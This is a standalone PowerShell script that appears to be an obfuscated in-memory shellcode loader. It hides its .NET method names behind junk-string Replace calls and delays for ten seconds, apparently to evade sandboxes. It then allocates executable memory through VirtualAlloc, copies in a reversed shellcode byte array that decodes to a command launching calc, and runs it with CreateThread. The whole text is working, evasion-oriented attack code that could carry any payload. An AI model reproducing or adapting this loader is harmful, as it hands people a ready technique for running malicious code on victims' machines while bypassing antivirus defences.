$kgOT = 'GFLitfmeFLitfmFLitfmtFLitfmAFLitfmsFLitfmsFLitfmeFLitfmmFLitfmbFLitfmlFLitfmiFLitfmeFLitfms'.Replace('FLitfm',''), 'GGOjgrmDGOjgrmDeGOjgrmDtTGOjgrmDypGOjgrmDe'.Replace('GOjgrmD',''),'CBLliguBLligrBLligrBLligeBLligntBLligDBLligoBLligmBLligaBLligiBLlign'.Replace('BLlig',''),'GLGBKvlLGBKvoLGBKvbLGBKvaLGBKvlLGBKvALGBKvsLGBKvsLGBKveLGBKvmLGBKvblLGBKvyLGBKvCLGBKvaLGBKvcLGBKvhe'.Replace('LGBKv',''),'IFLitfmnFLitfmvFLitfmoFLitfmFLitfmkFLitfme'.Replace('FLitfm',''),'GgkdsujrtmRRetgkdsujrtmRRDegkdsujrtmRRlegkdsujrtmRRgagkdsujrtmRRtegkdsujrtmRRFogkdsujrtmRRrFgkdsujrtmRRuncgkdsujrtmRRtiongkdsujrtmRRPogkdsujrtmRRingkdsujrtmRRter'.Replace('gkdsujrtmRR',''), 'SOikeOiktOikImOikplOikemOikenOiktaOiktiOikoOiknFOiklaOikgOiks'.Replace('Oik',''),'CFLitfmoFLitfmpFLitfmy'.Replace('FLitfm','');
#GetAsseblies, GetType, CurrentDomain,GlobalAssemblyCache,Invoke,GetDelegateForFunctionPointer,SetImplementationFlags,Copy

sleep(10);
function GBJutjmfa {
Param ($moduleName, $functionName)
$assm = ([AppDomain]::($kgOT[2]).($kgOT[0])() |
Where-Object { $_.($kgOT[3]) -And $_.Location.Split('\\')[-1].Equals('System.dll') }).($kgOT[1])('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$assm.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
return $tmp[0].($kgOT[4])($null, @(($assm.GetMethod('GetModuleHandle')).($kgOT[4])($null,@($moduleName)), $functionName))
}
function BUdogkt {
Param (
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void]
)

$type = [AppDomain]::($kgOT[2]).DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate]) 
$type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $func).($kgOT[6])('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,$func).($kgOT[6])('Runtime, Managed')
return $type.CreateType()
}

$lpMem =[System.Runtime.InteropServices.Marshal]::($kgOT[5])((GBJutjmfa kernel32.dll VirtualAlloc),(BUdogkt @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).($kgOT[4])([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]]$buf =00,0x63,0x6c,0x61,0x63,0x20,0x6b,0x2f,0x20,0x64,0x6d,0x63,0xd5,0xff,0xda,0x89,0x41,0x59,0x00,0x6a,0x6f,0x72,0x13,0x47,0xbb,0x05,0x75,0xe0,0xfb,0x80,0x0a,0x7c,0x06,0x3c,0x28,0xc4,0x83,0x48,0xd5,0xff,0x9d,0xbd,0x95,0xa6,0xba,0x41,0x56,0xa2,0xb5,0xf0,0xbb,0xd5,0xff,0x87,0x6f,0x8b,0x31,0xba,0x41,0x00,0x00,0x01,0x01,0x8d,0x8d,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0xba,0x48,0x5d,0xff,0xff,0xff,0x57,0xe9,0x12,0x8b,0x48,0x5a,0x59,0x41,0x58,0xe0,0xff,0x52,0x41,0x20,0xec,0x83,0x48,0x5a,0x41,0x59,0x41,0x58,0x41,0x5a,0x59,0x5e,0x58,0x41,0x58,0x41,0xd0,0x01,0x48,0x88,0x04,0x8b,0x41,0xd0,0x01,0x49,0x1c,0x40,0x8b,0x44,0x48,0x0c,0x8b,0x41,0x66,0xd0,0x01,0x49,0x24,0x40,0x8b,0x44,0x58,0xd8,0x75,0xd1,0x39,0x45,0x08,0x24,0x4c,0x03,0x4c,0xf1,0x75,0xe0,0x38,0xc1,0x01,0x41,0x0d,0xc9,0xc1,0x41,0xac,0xc0,0x31,0x48,0xc9,0x31,0x4d,0xd6,0x01,0x48,0x88,0x34,0x8b,0x41,0xc9,0xff,0x48,0x56,0xe3,0xd0,0x01,0x49,0x20,0x40,0x8b,0x44,0x18,0x48,0x8b,0x50,0xd0,0x01,0x48,0x67,0x74,0xc0,0x85,0x48,0x00,0x00,0x00,0x88,0x80,0x8b,0xd0,0x01,0x48,0x3c,0x42,0x8b,0x20,0x52,0x8b,0x48,0x51,0x41,0x52,0xed,0xe2,0xc1,0x01,0x41,0x0d,0xc9,0xc1,0x41,0x20,0x2c,0x02,0x7c,0x61,0x3c,0xac,0xc0,0x31,0x48,0xc9,0x31,0x4d,0x4a,0x4a,0xb7,0x0f,0x48,0x50,0x72,0x8b,0x48,0x20,0x52,0x8b,0x48,0x18,0x52,0x8b,0x48,0x60,0x52,0x8b,0x48,0x65,0xd2,0x31,0x48,0x56,0x51,0x52,0x50,0x41,0x51,0x41,0x00,0x00,0x00,0xc0,0xe8,0xf0,0xe4,0x83,0x48,0xfc

[array]::reverse($buf)
[System.Runtime.InteropServices.Marshal]::($kgOT[7])($buf, 0, $lpMem, $buf.length)
$hThread =[System.Runtime.InteropServices.Marshal]::($kgOT[5])((GBJutjmfa kernel32.dll CreateThread), (BUdogkt @([IntPtr], [UInt32], [IntPtr], [IntPtr],[UInt32], [IntPtr])([IntPtr]))).($kgOT[4])([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::($kgOT[5])((GBJutjmfa kernel32.dll WaitForSingleObject), (BUdogkt @([IntPtr], [Int32])([Int]))).($kgOT[4])($hThread, 0xFFFFFFFF)
